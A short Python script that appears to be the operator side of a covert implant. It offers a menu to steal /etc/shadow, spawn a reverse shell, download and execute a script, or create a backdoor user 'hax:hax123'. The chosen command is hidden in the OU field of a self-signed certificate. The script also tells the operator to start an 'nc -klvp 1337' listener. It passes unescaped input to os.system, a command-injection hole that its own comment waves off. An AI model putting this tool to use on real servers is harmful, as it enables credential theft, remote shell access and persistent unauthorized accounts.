#!/usr/bin/env python3
import os
import sys

if(len(sys.argv) != 2):
    print("usage: {} domain".format(sys.argv[0]))
    sys.exit(1)
domain = sys.argv[1]
opts = """
1: steal /etc/shadow
2: spawn reverse shell
3: download & execute script
4: create new user
"""
print(opts)
opt = input("option > ")
print()
if(opt == "1"):
    cmd = "r"
elif(opt == "2"):
    cmd = "s"
    print("run: nc -klvp 1337")
elif(opt == "3"):
    cmd = "d"
    print("move binary to file named \"exec\"")
elif(opt == "4"):
    cmd = "c"
    print("user created: hax:hax123")
else:
    print("{} is not a valid option.".format(opt))
    sys.exit(1)
certopts = "/C=US/O=RealCorp/OU={}/CN={}".format(cmd, domain)
os.system("openssl genrsa -out server.key 2048 2> /dev/null")
os.system("openssl ecparam -genkey -name secp384r1 -out server.key 2> /dev/null")
# yeah - not worried about letting users run their own system command on their own server..
os.system("openssl req -new -x509 -sha256 -key server.key -out server.crt -days 3650 -subj \"{}\" 2> /dev/null".format(certopts))
